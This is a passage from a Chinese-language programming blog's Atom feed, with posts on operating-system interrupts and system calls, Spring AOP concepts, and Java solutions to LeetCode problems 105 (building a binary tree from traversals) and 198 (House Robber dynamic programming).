class><ol><li>中断发生时，CPU立刻进入核心态</li><li>中断发生时，当前进程暂停运行，由操作系统内核对中断进行处理</li><li>对于不同的中断信号，会进行不同的处理</li></ol><p>用户态到核心态的变化是通过<strong>中断</strong>来实现的，且中断是<strong>唯一</strong>途径。核心态到用户态是通过执行一个特权指令，将程序状态字（PSW）的标志位设置为“用户态”。</p><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>操作系统作为用户和计算机硬件之间的接口要向上面提供一些简单易用的服务。包括命令接口和程序接口，其中程序接口由一组<strong>系统调用</strong>组成。</p><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320192458386.png" class><p>系统调用是操作系统给程序员使用的接口，是一种特殊的函数。系统中各种共享资源都由操作系统统一掌管，凡是与资源有关的操作，都必须通过系统调用的方式向操作系统发出请求，由操作系统<strong>代为完成</strong>，这样就可以保证系统稳定性。</p><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320193135322.png" class><img src="/2022/03/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20220320193450621.png" class><p>至此有关操作系统的前置东西大概讲了讲，后面会进行每个部分的具体讲解</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;操作系统概念&quot;&gt;&lt;a href=&quot;#操作系统概念&quot; class=&quot;headerlink&quot; title=&quot;操作系统概念&quot;&gt;&lt;/a&gt;操作系统概念&lt;/h1&gt;&lt;h3 id=&quot;操作系统的功能与目标&quot;&gt;&lt;a href=&quot;#操作系统的功能与目标&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="操作系统" scheme="http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>SpringAOP</title>
    <link href="http://example.com/2022/03/19/Spring/SpringAOP/"/>
    <id>http://example.com/2022/03/19/Spring/SpringAOP/</id>
    <published>2022-03-19T15:54:40.000Z</published>
    <updated>2022-03-19T16:07:50.896Z</updated>
    
    <content type="html"><![CDATA[<p>AOP即面向切编程，利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各个部分耦合度降低，提高程序的可重用性，提高开发效率</p><p>将日志记录、性能统计、安全控制、事务处理、异常处理从业务逻辑划分划分处理</p><p>这个可以体现软件设计的<strong>开闭原则</strong>（软件中的对象（类，模块，函数等等）应该对于扩展是开放的，但是对于修改是封闭的”[<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E9%97%AD%E5%8E%9F%E5%88%99#cite_note-1">1]</a>，这意味着一个实体是允许在不改变它的<a href="https://zh.wikipedia.org/wiki/%E6%BA%90%E4%BB%A3%E7%A0%81">源代码</a>的前提下变更它的行为。）即不修改源代码方式添加新的功能</p><h3 id="AOP底层原理"><a href="#AOP底层原理" class="headerlink" title="AOP底层原理"></a>AOP底层原理</h3><ol><li>AOP底层使用动态代理</li></ol><p>第一种 ：有接口的情况</p><img src="/2022/03/19/Spring/SpringAOP/image-20220319230831202.png" class><p>创建接口实现类的方式实现代理对象</p><ol start="2"><li>没有接口的情况</li></ol><img src="/2022/03/19/Spring/SpringAOP/image-20220319231306571.png" class><p>创建当前类子类的代理对象</p><h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><ol><li>连接点</li></ol><p>类里有哪些方法可以被增强，这些方法就称为连接点</p><ol start="2"><li>切入点</li></ol><p>实际被增强的方法</p><ol start="3"><li>通知（增强）</li></ol><p>实际增强的逻辑部分被称为通知</p><ul><li>前置通知</li></ul><p>方法执行之前通知</p><ul><li>后置通知</li></ul><p>方法执行之后通知</p><ul><li>环绕通知</li></ul><p>执行前后头通知</p><ul><li>异常通知</li></ul><p>方法执行异常会通知</p><ul><li>最终通知</li></ul><p>不管有没有异常都会执行，相当于finally</p><ol start="4"><li>切面</li></ol><p>是动作，把通知应用到切入点的过程称为切面</p><p>spring基于aspectJ 实现AOP操作</p><img src="/2022/03/19/Spring/SpringAOP/image-20220319232745557.png" class><img src="/2022/03/19/Spring/SpringAOP/image-20220319233036476.png" class><img src="/2022/03/19/Spring/SpringAOP/image-20220319233155028.png" class><img src="/2022/03/19/Spring/SpringAOP/image-20220319233338050.png" class><img src="/2022/03/19/Spring/SpringAOP/image-20220319233409784.png" class><p>至此关于spring的使用过程已经讲解结束，其实我很早之前就使用过AOP，这里只是挑了自己感兴趣的地方看了看，如果浪费了大家的时间，希望大家理解</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;AOP即面向切编程，利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各个部分耦合度降低，提高程序的可重用性，提高开发效率&lt;/p&gt;
&lt;p&gt;将日志记录、性能统计、安全控制、事务处理、异常处理从业务逻辑划分划分处理&lt;/p&gt;
&lt;p&gt;这个可以体现软件设计的&lt;strong&gt;</summary>
      
    
    
    
    <category term="Spring" scheme="http://example.com/categories/Spring/"/>
    
    
    <category term="Spring" scheme="http://example.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode105从前序与中序遍历序列构造二叉树</title>
    <link href="http://example.com/2022/03/17/Algo/LeetCode105%E4%BB%8E%E5%89%8D%E5%BA%8F%E4%B8%8E%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <id>http://example.com/2022/03/17/Algo/LeetCode105%E4%BB%8E%E5%89%8D%E5%BA%8F%E4%B8%8E%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/</id>
    <published>2022-03-17T15:13:44.000Z</published>
    <updated>2022-03-17T15:37:21.710Z</updated>
    
    <content type="html"><![CDATA[<p>今天分享一道mid的二叉树题目：<a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/">从前序与中序遍历序列构造二叉树</a>，每次遇到二叉树题目的时候，一定一定一定要先想想递归的思想</p><p>什么是递归的思想，递归一般要考虑如何去分解问题，如何把分解的问题结果进行合并，由于我们只讲本道题目，所以递归的思想我就不过多赘述。</p><p>说实话，这道题目一直是我的梦魇，我看过这道题很多遍了，每次都手足无措，可能是因为我的心里就不想去做它，今天看了题解，可算是明白这道题怎么解了。不多说了，我们之间进入题解</p><p>前序遍历的结果是: [1,2,4,5,3,6,7]<br>中序遍历的结果是: [4,2,5,1,6,3,7]<br>前序遍历的特点是， 根节点 始终出现在数组的第一位，而中序遍历中 根节点 出现在数组的中间位置，这里的中间不是绝对中间，而是相对中间。</p><p>根据上面给出的两个数组，首先我们就可以拼出 <code>根节点</code>，它就是 <code>1</code>。在中序遍历数组里面，1的左侧就是左子树全部节点，1的右侧就是右子树的全部节点。</p><img src="/2022/03/17/Algo/LeetCode105%E4%BB%8E%E5%89%8D%E5%BA%8F%E4%B8%8E%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220317232050939.png" class><p>如图，还有值得一提的是：两个数组的长度一定一定是相等的。</p><p>这道题是一个典型的<strong>分治</strong>算法</p><p>所以我们现在就去new一个节点，它的值为1，那它的左子树和右子树是什么呢？这就交给它的两个小弟吧（递归思想）。那现在问题应该如何去分解呢？</p><p>我们把两个数组分为以下四部分</p><img src="/2022/03/17/Algo/LeetCode105%E4%BB%8E%E5%89%8D%E5%BA%8F%E4%B8%8E%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220317232743037.png" class><p>in_left为中序遍历的左侧全部节点，in_right为中序遍历右侧全部节点</p><p>pre_left为前序遍历的左侧全部节点，pre_right为前序遍历右侧全部节点</p><p>然后我们现在当前树的根节点就是pre_order的第一个节点，它的左子树就交给buildTree(pre_left, in_left);右子树就交给buildTree(pre_right, in_right);</p><p>最后返回根节点就可以了</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * public class TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode left;</span><br><span class="hljs-comment"> *     TreeNode right;</span><br><span class="hljs-comment"> *     TreeNode() &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span><br><span class="hljs-comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span><br><span class="hljs-comment"> *         this.val = val;</span><br><span class="hljs-comment"> *         this.left = left;</span><br><span class="hljs-comment"> *         this.right = right;</span><br><span class="hljs-comment"> *     &#125;</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> TreeNode <span class="hljs-title function_">buildTree</span><span class="hljs-params">(<span class="hljs-type">int</span>[] preorder, <span class="hljs-type">int</span>[] inorder)</span> &#123;<br>        <span class="hljs-comment">// 这里两个数组应该是等长的</span><br>        <span class="hljs-keyword">if</span> (preorder.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">TreeNode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(preorder[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; inorder.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (inorder[i] == preorder[<span class="hljs-number">0</span>]) &#123;<br>                <span class="hljs-type">int</span>[] pre_left = Arrays.copyOfRange(preorder, <span class="hljs-number">1</span>, i+<span class="hljs-number">1</span>);<br>                <span class="hljs-type">int</span>[] pre_right = Arrays.copyOfRange(preorder, i+<span class="hljs-number">1</span>, preorder.length);<br>                <span class="hljs-type">int</span>[] in_left = Arrays.copyOfRange(inorder, <span class="hljs-number">0</span>, i);<br>                <span class="hljs-type">int</span>[] in_right = Arrays.copyOfRange(inorder, i+<span class="hljs-number">1</span>, inorder.length);<br>                node.left = buildTree(pre_left, in_left);<br>                node.right = buildTree(pre_right, in_right);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> node;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后附上完整的程序，值得一提的是Arrays.copyOfRange（arr, start, end）在复制数组的时候是[start : end)，也就是前闭后开的结果</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天分享一道mid的二叉树题目：&lt;a href=&quot;https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/&quot;&gt;从前序与中序遍历序列构造二叉树&lt;/a&gt;</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://example.com/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="http://example.com/tags/Algorithm/"/>
    
    <category term="二叉树" scheme="http://example.com/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
    <category term="分治" scheme="http://example.com/tags/%E5%88%86%E6%B2%BB/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode198打家劫舍</title>
    <link href="http://example.com/2022/03/17/Algo/LeetCode198%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8D/"/>
    <id>http://example.com/2022/03/17/Algo/LeetCode198%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8D/</id>
    <published>2022-03-17T14:04:55.000Z</published>
    <updated>2022-03-17T15:53:35.079Z</updated>
    
    <content type="html"><![CDATA[<p>今天来分享一道简单的动态规划题目：<a href="https://leetcode-cn.com/problems/house-robber/">打家劫舍</a></p><p>动态规划有两大注意点：</p><ol><li>一个原问题是建立在子问题的基础之上，所以找出两者关系至关重要</li><li>用空间换时间，把子问题的答案用一个空间记录下来，在这样子原问题就不需要重复计算了</li></ol><p>对于这个问题我们假设：dp[i] 代表前 i 个房子在满足条件下的能偷窃到的最高金额。我们现在的目的是想找到的dp[n]最大，那让我们现在想想dp[n+1]与dp[n]的关系。</p><p>假设第 n 间没有被偷，那么此时 dp[n]&#x3D;dp[n−1] ，此时 dp[n+1] &#x3D; dp[n] + num &#x3D; dp[n-1] + num ，即两种情况可以 合并为一种情况 考虑；<br>假设第 n 间被偷，那么此时 dp[n+1]&#x3D;dp[n]+num 不可取 ，因为偷了第 n 间就不能偷第 n+1 间。</p><p>得到转移方程 dp[n+1] &#x3D; max(dp[n],dp[n-1]+num)</p><p>所以我们只需要用两个值分别记录dp[n-1]和dp[n]就可以了。</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">rob</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;<br>        <span class="hljs-comment">// 注意这里pre为dp[n-1], cur为dp[n];</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">pre</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, cur = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> cur;<br>            cur = Math.max(pre + nums[i], cur);<br>            pre = temp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> cur;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后可以看到其实解题过程十分简单，并不是所有的动态规划都需要去创建一个与原数组等长的数组</p><p>同时我们也可以得出来：要分析子问题和原问题的关系尤为重要</p><p>在这里多插一句：我们常认为动态规划和贪心算法有某种关联，其实贪心算法就像是一种特殊的动态规划算法，因为当可以贪心的时候，它一定被证明过有某种东西可贪，所以如果想使用贪心算法，那证明过程一定十分重要</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天来分享一道简单的动态规划题目：&lt;a href=&quot;https://leetcode-cn.com/problems/house-robber/&quot;&gt;打家劫舍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;动态规划有两大注意点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个原问题是建立在子问题的基础之上，所以找出</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://example.com/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="http://example.com/tags/Algorithm/"/>
    
    <category term="动态规划" scheme="http://example.com/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
</feed>
